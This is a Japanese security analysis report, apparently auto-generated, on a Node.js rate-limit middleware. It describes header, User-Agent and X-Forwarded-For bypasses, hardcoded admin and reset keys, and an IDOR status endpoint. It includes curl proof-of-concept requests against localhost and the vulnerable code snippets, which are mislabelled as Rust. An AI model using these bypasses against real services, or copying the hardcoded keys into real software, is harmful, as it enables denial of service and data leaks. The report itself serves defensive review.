# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `IDOR`

## 解析結果

本ミドルウェアには以下の深刻な脆弱性が存在します。

1. レート制限バイパス (ヘッダー/UA/IP偽装)
   - 任意のBYPASS_HEADERSヘッダーをtrueまたは任意値で送信すると制限を完全にスキップできる。さらにUser-Agentに「bot」や「crawler」を含めるだけで通過でき、X-Forwarded-Forヘッダーを操作してIPごとの制限回避が可能。

2. 動的レート制限変更の認可不備
   - `x-admin-key`ヘッダーに固定文字列（"rate_limit_admin"／"admin123"）を与えれば、誰でも`limit`パラメータで上限値を書き換え可能。

3. レート制限状況情報の未認可公開 (IDOR)
   - 認証・認可チェックなしに任意のclientIdをクエリで指定でき、他ユーザのリクエスト履歴（全タイムスタンプ）や全クライアントIDリストを取得できる。

4. 全体リセット許可の認可不備
   - `x-reset-key`ヘッダーに固定文字列（"reset123"／"admin"）を与えるだけで、全クライアントのレート制限状態をクリアできる。

影響：攻撃者は無制限にリクエストを送信したり、任意のIP／ユーザの制限状況を盗み見／操作可能となり、サービス拒否（DoS）や情報漏洩を招きます。

## PoC（概念実証コード）

```text
1) ヘッダーバイパス
   curl -H "X-Bypass-Rate-Limit: true" http://localhost:3000/api/resource
2) UAバイパス
   curl -A "mycrawler" http://localhost:3000/api/resource
3) レート制限変更 (認可不要)
   curl -X POST -H "Content-Type: application/json" -H "x-admin-key: admin123" -d '{"limit":1000}' http://localhost:3000/api/adjust
4) 他者ステータス参照 (IDOR)
   curl http://localhost:3000/api/status?clientId=192.0.2.1
5) 全体リセット (認可不要)
   curl -X POST -H "x-reset-key: admin" http://localhost:3000/api/reset
```

## 関連コードコンテキスト

### 関数名: rateLimitMiddleware
- 理由: 任意のヘッダーでレート制限をバイパス可能
- パス: middleware/ratelimit.js
```rust
for (const header of RATE_LIMIT_CONFIG.BYPASS_HEADERS) { if (req.headers[header] === 'true' || req.headers[header]) { return next(); } }
```

### 関数名: rateLimitMiddleware
- 理由: User-Agentを偽装するだけでバイパス可能
- パス: middleware/ratelimit.js
```rust
if (userAgent && (userAgent.includes('bot') || userAgent.includes('crawler'))) { return next(); }
```

### 関数名: adjustRateLimit
- 理由: 固定値による弱い管理キー検証で動的に制限値を変更可能
- パス: middleware/ratelimit.js
```rust
if (adminKey === 'rate_limit_admin' || adminKey === 'admin123') {
```

### 関数名: getRateLimitStatus
- 理由: 認可なしに他クライアントの制限状況および全IDリストを取得可能 (IDOR)
- パス: middleware/ratelimit.js
```rust
res.json({ client_id: clientId, requests_in_window: recentRequests.length, limit: RATE_LIMIT_CONFIG.DEFAULT_LIMIT, remaining: RATE_LIMIT_CONFIG.DEFAULT_LIMIT - recentRequests.length, window_ms: RATE_LIMIT_CONFIG.WINDOW_MS, request_timestamps: requests, all_clients: Array.from(this.rateLimitStore.keys()) });
```

### 関数名: resetRateLimit
- 理由: 固定値による弱いリセットキー検証で全クライアントの状態をクリア可能
- パス: middleware/ratelimit.js
```rust
if (resetKey === 'reset123' || resetKey === 'admin') {
```

## 解析ノート

多彩なバイパス手法と弱いキー検証、未認可情報公開でDoSや情報漏洩が可能と判断した。

